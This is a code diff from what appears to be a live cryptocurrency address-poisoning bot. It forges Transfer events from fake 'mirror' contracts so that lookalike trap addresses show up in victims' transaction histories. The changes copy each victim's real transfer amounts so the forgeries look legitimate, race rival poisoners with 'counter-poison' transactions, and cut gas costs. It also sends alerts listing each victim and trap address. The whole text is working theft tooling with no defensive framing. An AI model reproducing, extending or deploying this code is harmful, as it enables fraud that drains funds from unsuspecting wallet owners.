@@ -821,7 +821,7 @@ function isCompetitivePoison(tx, victimEntry) {
  * Immediately counter-poison when we detect another attacker.
  * Matches the victim's last REAL transfer amount/asset to look legitimate.
  */
-async function counterPoison(victimAddress, victimEntry, tx = null) {
+async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw = 0n, currentAsset = null) {
   const now = Date.now();
 
   // Prevent spam (min 2 minutes between counter-poisons)
@@ -842,63 +842,86 @@ async function counterPoison(victimAddress, victimEntry, tx = null) {
       return false;
     }
 
-    // 🎯 Fetch the victim's LAST real transfer to the real counterparty
-    // This is what makes our counter-poison look like a legitimate repeat transaction
-    let mirrorRaw = BigInt('1000000000000000000'); // Default: 1 ETH
-    let mirrorAsset = 'ETH';
-    let mirrorContract = MIRROR_TOKEN_NATIVE;
+    // 🎯 Use the CURRENT transaction amount if available, otherwise check queue, then fallback to DB
+    let mirrorRaw = currentRaw || 0n;
+    let mirrorAsset = currentAsset || 'ETH';
+    let mirrorContract = MIRROR_CONTRACTS[mirrorAsset] || MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;
 
-    if (supabaseService) {
-      try {
-        const { data: trapData, error } = await supabaseService
-          .from('traps')
-          .select('last_transfer_amount, last_transfer_asset')
-          .eq('victim_address', victimAddress.toLowerCase())
-          .eq('counterparty_address', victimEntry.counterparty?.toLowerCase())
-          .limit(1)
-          .maybeSingle();
-
-        if (!error && trapData && trapData.last_transfer_amount && trapData.last_transfer_asset) {
-          const realAmount = trapData.last_transfer_amount;
-          const realAsset = trapData.last_transfer_asset;
-
-          // Parse the amount (could be hex string, decimal string, or integer)
-          let rawValue = BigInt(0);
-          const amountStr = String(realAmount).trim();
-
-          if (amountStr.startsWith('0x') || amountStr.startsWith('0X')) {
-            rawValue = BigInt(amountStr);
-          } else if (amountStr.includes('.')) {
-            // Decimal - convert to raw units based on asset decimals
-            const decimals = getDecimals(realAsset);
-            const parts = amountStr.split('.');
-            const whole = BigInt(parts[0] || '0');
-            const fracStr = (parts[1] || '').padEnd(decimals, '0').slice(0, decimals);
-            const frac = BigInt(fracStr || '0');
-            rawValue = whole * (10n ** BigInt(decimals)) + frac;
-          } else {
-            rawValue = BigInt(amountStr);
+    if (mirrorRaw > 0n) {
+      const decimals = getDecimals(mirrorAsset);
+      const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
+      logger.info(`[competitive] ✅ Using current transaction amount: ${humanAmount} ${mirrorAsset}`);
+    } else {
+      // Fallback 1: Check if an auto-poison is already in the queue for this victim
+      let foundInQueue = false;
+      for (const [qKey, qItems] of poisonQueue.entries()) {
+        const [campId, contractAddr] = qKey.split(':');
+        if (campId === victimEntry.campaignId) {
+          const existing = qItems.find(i => i.victimAddress.toLowerCase() === victimAddress.toLowerCase() && i.type === 'auto');
+          if (existing) {
+            mirrorRaw = existing.rawValue;
+            mirrorAsset = existing.detectedAsset;
+            mirrorContract = contractAddr;
+            logger.info(`[competitive] 🔄 Reusing auto-poison amount from queue: ${mirrorRaw} ${mirrorAsset}`);
+            foundInQueue = true;
+            break;
           }
-
-          if (rawValue > 0n) {
-            mirrorRaw = rawValue;
-            mirrorAsset = realAsset;
-
-            // Use the correct stealth contract for this asset
-            mirrorContract =
-              MIRROR_CONTRACTS[realAsset] ||
-              MIRROR_CONTRACTS[realAsset?.toUpperCase()] ||
-              MIRROR_TOKEN_NATIVE;
-
-            const decimals = getDecimals(realAsset);
-            const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
-            logger.info(`[competitive] Matching victim's last real transfer: ${humanAmount} ${realAsset}`);
-          }
-        } else {
-          logger.info(`[competitive] No real transfer history found, using default 1 ETH`);
         }
-      } catch (dbErr) {
-        logger.warn(`[competitive] Failed to fetch last transfer: ${dbErr.message}, using default`);
+      }
+
+      // Fallback 2: DB query (only if no current amount and not in queue)
+      if (!foundInQueue && supabaseService) {
+        try {
+          const { data: trapData, error } = await supabaseService
+            .from('traps')
+            .select('last_transfer_amount, last_transfer_asset')
+            .eq('victim_address', victimAddress.toLowerCase())
+            .eq('counterparty_address', victimEntry.counterparty?.toLowerCase())
+            .limit(1)
+            .maybeSingle();
+
+          if (!error && trapData && trapData.last_transfer_amount && trapData.last_transfer_asset) {
+            const realAmount = trapData.last_transfer_amount;
+            const realAsset = trapData.last_transfer_asset;
+
+            let rawValue = BigInt(0);
+            const amountStr = String(realAmount).trim();
+
+            if (amountStr.startsWith('0x') || amountStr.startsWith('0X')) {
+              rawValue = BigInt(amountStr);
+            } else if (amountStr.includes('.')) {
+              const decimals = getDecimals(realAsset);
+              const parts = amountStr.split('.');
+              const whole = BigInt(parts[0] || '0');
+              const fracStr = (parts[1] || '').padEnd(decimals, '0').slice(0, decimals);
+              const frac = BigInt(fracStr || '0');
+              rawValue = whole * (10n ** BigInt(decimals)) + frac;
+            } else {
+              rawValue = BigInt(amountStr);
+            }
+
+            if (rawValue > 0n) {
+              mirrorRaw = rawValue;
+              mirrorAsset = realAsset;
+              mirrorContract = MIRROR_CONTRACTS[realAsset] || MIRROR_CONTRACTS[realAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;
+
+              const decimals = getDecimals(realAsset);
+              const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
+              logger.info(`[competitive] 🗄️ Fallback to DB historical amount: ${humanAmount} ${realAsset}`);
+            }
+          } else {
+            logger.info(`[competitive] No real transfer history found, using default 1 ETH`);
+          }
+        } catch (dbErr) {
+          logger.warn(`[competitive] Failed to fetch last transfer: ${dbErr.message}, using default`);
+        }
+      }
+
+      // Final fallback if still 0
+      if (mirrorRaw === 0n) {
+        mirrorRaw = BigInt('1000000000000000000'); // 1 ETH
+        mirrorAsset = 'ETH';
+        mirrorContract = MIRROR_TOKEN_NATIVE;
       }
     }
 
@@ -1041,20 +1064,22 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ULTRA-CHEAP GAS: Hardcoded to save maximum money
-    let maxFeePerGas = 1000000000n; // 1 gwei absolute ceiling
-    let maxPriorityFeePerGas = 5000000n; // 🚀 0.005 gwei tip (Extremely cheap!)
+    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
+    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
+    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
       let networkMaxFee = feeData.maxFeePerGas || 0n;
 
-      // If network base fee is sane (< 0.5 gwei), use it + our tiny tip
-      if (networkMaxFee > 0n && networkMaxFee < 500000000n) {
-        maxFeePerGas = networkMaxFee + 5000000n;
+      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
+      } else if (networkMaxFee >= 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
+        maxPriorityFeePerGas = 1n;
       }
     } catch (e) {
-      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
@@ -1086,7 +1111,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           functionName: 'transferFrom',
           args: [victimAddress, trapAddress, rawValue],
           nonce: nonce,
-          gas: 60000n,
+          gas: 50000n, // 🚀 Bare minimum gas limit for single event emission
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -1205,20 +1230,35 @@ function queuePoison(campaignId, contractAddress, victimAddress, trapAddress, ra
   );
 
   if (existingIndex !== -1) {
-    // Already in queue! Update the existing item instead of adding a duplicate.
     const existingItem = queue[existingIndex];
 
-    // Upgrade to 'counter' type if the new event is a counter-poison (gives it the 🏆 icon)
-    if (type === 'counter' && existingItem.type === 'auto') {
-      existingItem.type = 'counter';
+    // 🚀 FIX: If an auto-poison is already in queue, and a counter-poison comes in,
+    // we WANT to use the auto-poison's REAL-TIME amount, but mark it as overridden!
+    if (existingItem.type === 'auto' && type === 'counter') {
+      existingItem.type = 'counter'; // Change icon to 🏆
+      existingItem.overridden = true; // Mark as overridden for the alert
+      // DO NOT change existingItem.rawValue or existingItem.detectedAsset!
+      logger.info(`[batch] ⚠️ Auto-poison overridden by counter-poison for ${victimAddress.slice(0, 10)}... (Keeping real-time amount: ${existingItem.rawValue} ${existingItem.detectedAsset})`);
+      return;
     }
 
-    // Update value and timestamp to the absolute latest
-    existingItem.rawValue = rawValue;
-    existingItem.timestamp = Date.now();
+    // If a counter-poison is already in queue, and an auto-poison comes in,
+    // Upgrade to auto, keep auto's real-time amount
+    if (existingItem.type === 'counter' && type === 'auto') {
+      existingItem.type = 'auto';
+      existingItem.rawValue = rawValue;
+      existingItem.detectedAsset = detectedAsset;
+      existingItem.overridden = false;
+      logger.info(`[batch] ⬆️ Counter-poison upgraded to auto-poison for ${victimAddress.slice(0, 10)}...`);
+      return;
+    }
 
+    // If both are the same type, just update the timestamp and value
+    existingItem.rawValue = rawValue;
+    existingItem.detectedAsset = detectedAsset;
+    existingItem.timestamp = Date.now();
     logger.info(`[batch] ♻️ Deduplicated: ${victimAddress.slice(0, 10)}... → ${trapAddress.slice(0, 10)}... already in queue. Updated existing.`);
-    return; // Skip pushing and threshold checks
+    return;
   }
 
   queue.push({
@@ -1352,20 +1392,22 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ULTRA-CHEAP GAS: Hardcoded to save maximum money
-    let maxFeePerGas = 1000000000n; // 1 gwei absolute ceiling
-    let maxPriorityFeePerGas = 5000000n; // 🚀 0.005 gwei tip (Extremely cheap!)
+    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
+    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
+    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
       let networkMaxFee = feeData.maxFeePerGas || 0n;
 
-      // If network base fee is sane (< 0.5 gwei), use it + our tiny tip
-      if (networkMaxFee > 0n && networkMaxFee < 500000000n) {
-        maxFeePerGas = networkMaxFee + 5000000n;
+      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
+      } else if (networkMaxFee >= 1000000000n) {
+        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
+        maxPriorityFeePerGas = 1n;
       }
     } catch (e) {
-      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     if (maxPriorityFeePerGas >= maxFeePerGas) {
@@ -1394,7 +1436,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(50000 + (25000 * froms.length)), // 🚀 Reduced gas limit to lower max cost
+          gas: BigInt(40000 + (5000 * froms.length)), // 🚀 Bare minimum gas limit for event emission
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -1508,12 +1550,17 @@ async function sendBatchAlert(items, txHash, contractAddress) {
   const lines = items.map((item, idx) => {
     const decimals = getDecimals(item.detectedAsset || 'ETH');
     const amountDisplay = (Number(item.rawValue) / (10 ** decimals)).toFixed(4);
-    const icon = item.type === 'counter' ? '🏆' : '🪞';
+
+    let icon = item.type === 'counter' ? '🏆' : '🪞';
+    let overrideLabel = '';
+    if (item.type === 'counter' && item.overridden) {
+      overrideLabel = ' *(Auto Overridden)*';
+    }
 
     const victimUrl = getExplorerUrl(item.victimAddress);
     const trapUrl = getExplorerUrl(item.trapAddress);
 
-    return `${icon} *${idx + 1}.* (${amountDisplay} ${item.detectedAsset || '?'})\n` +
+    return `${icon} *${idx + 1}.* (${amountDisplay} ${item.detectedAsset || '?'})${overrideLabel}\n` +
       `👤 Victim: \`${item.victimAddress}\`\n🔗 ${victimUrl}\n` +
       `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`;
   });
@@ -1691,15 +1738,30 @@ function checkTransaction(tx, txLogs = []) {
     return suspectWithout0x.slice(0, 4) === prefix && suspectWithout0x.slice(-4) === suffix;
   }
 
+  // 🚀 Calculate asset and amount EARLY
+  const earlyDetectedAsset = getAssetFromTx(tx);
+  const earlyMirrorRaw = computeMirrorRawValue(tx, earlyDetectedAsset, txLogs, from);
+
+  // Helper to safely extract amount from a Transfer log
+  const getLogAmount = (log) => {
+    if (log && log.data && log.data.length >= 66) {
+      try { return BigInt(log.data); } catch { return 0n; }
+    }
+    return 0n;
+  };
+
   // 1. Direct transaction checks (O(1) lookups)
   const senderEntry = victims.get(from);
   const receiverEntry = victims.get(to);
 
   if (senderEntry && isCompetitivePoison(tx, senderEntry)) {
-    counterPoison(from, senderEntry, tx);
+    // Victim is the sender, so earlyMirrorRaw is the victim's real transfer amount
+    counterPoison(from, senderEntry, tx, earlyMirrorRaw, earlyDetectedAsset);
   }
   if (receiverEntry && isCompetitivePoison(tx, receiverEntry)) {
-    counterPoison(to, receiverEntry, tx);
+    // Victim is the receiver, meaning earlyMirrorRaw is the ATTACKER's amount. 
+    // Pass 0n to force it to safely fallback to the queue/DB.
+    counterPoison(to, receiverEntry, tx, 0n, null);
   }
 
   // 2. Transfer log checks (O(1) lookups per log)
@@ -1708,19 +1770,33 @@ function checkTransaction(tx, txLogs = []) {
 
     const logFrom = log.args?.from?.toLowerCase() || '';
     const logTo = log.args?.to?.toLowerCase() || '';
+    const logAmount = getLogAmount(log);
+    const logContract = log.address?.toLowerCase() || '';
+
+    // 🚀 Determine if the log is from a known real token contract (USDC, USDT, etc.)
+    // If it's NOT in our known tokens map, it's an attacker's fake Mirror contract!
+    const isRealToken = tokenAddressMap.has(logContract);
 
     // Check if sender is our victim
     const logSenderEntry = victims.get(logFrom);
     if (logSenderEntry && isCompetitorLog(logTo, logSenderEntry)) {
       logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Victim: ${logFrom} → Attacker: ${logTo}`);
-      counterPoison(logSenderEntry.victimAddress, logSenderEntry);
+      // Victim is the sender in the log, use the log's exact amount
+      counterPoison(logSenderEntry.victimAddress, logSenderEntry, tx, logAmount, earlyDetectedAsset);
     }
 
-    // Check if receiver is our victim
+    // Check if receiver is our victim (Attacker -> Victim)
     const logReceiverEntry = victims.get(logTo);
     if (logReceiverEntry && isCompetitorLog(logFrom, logReceiverEntry)) {
-      logger.info(`[competitive] 🚨 Detected forged Transfer in logs! Attacker: ${logFrom} → Victim: ${logTo}`);
-      counterPoison(logReceiverEntry.victimAddress, logReceiverEntry);
+      if (!isRealToken) {
+        // 🎭 Attacker used a fake mirror contract. Use the attacker's emitted amount!
+        logger.info(`[competitive] 🎭 Attacker used fake mirror contract. Using attacker's emitted amount: ${logAmount}`);
+        counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, logAmount, earlyDetectedAsset);
+      } else {
+        // 💧 Attacker sent real dust via a real token contract. Pass 0n to force DB fallback to last victim->counterparty amount.
+        logger.info(`[competitive] 💧 Attacker sent real dust via ${logContract}. Will fallback to last victim->counterparty amount.`);
+        counterPoison(logReceiverEntry.victimAddress, logReceiverEntry, tx, 0n, null);
+      }
     }
   }
 
